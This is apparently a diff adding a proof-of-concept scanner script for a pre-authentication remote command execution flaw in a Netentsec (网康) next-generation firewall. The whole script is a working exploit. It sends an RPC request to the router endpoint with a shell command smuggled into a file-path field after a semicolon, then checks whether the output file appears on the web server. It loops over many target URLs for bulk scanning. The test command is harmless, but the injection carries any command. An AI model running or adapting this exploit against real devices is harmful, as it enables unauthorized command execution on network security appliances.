@@ -1,0 +1,33 @@
+#request urls = array
+#define payload = {"action": "SSLVPN_Resource", "method": "deleteImage", "data": [{"data": ["/var/www/html/d.txt;wwwwww > /var/www/html/1.txt"]}], "type": "rpc", "tid": 17}
+#define bug = ":{"success":true
+function poc(url){
+	res = HttpPost(url."/directdata/direct/router",StrReplace(payload,"wwwwww","echo test666"),"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36".StrRN()."X-Requested-With: XMLHttpRequest");
+	if(StrFindStr(res[0],bug,0) != "-1"){
+		r = HttpGet(url."/1.txt","User-Agent: Mozilla/5.0");
+		if(StrFindStr(r[0],"test666",0) != "-1"){
+			return 1;
+		}else{
+			return 0;
+		}
+	}else{
+		return 0;
+	}
+}
+function main(args){
+	printclolor("当前正在检测:网康下一代防火墙前台RCE",1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			r = poc(url);
+			if(r == 1){
+				printclolor(url."存在网康下一代防火墙前台RCE！",3);
+			}
+		}catch{
+			printclolor(url."请求出错！",1);
+		}
+		i = ToInt(i+1);
+	}
+}
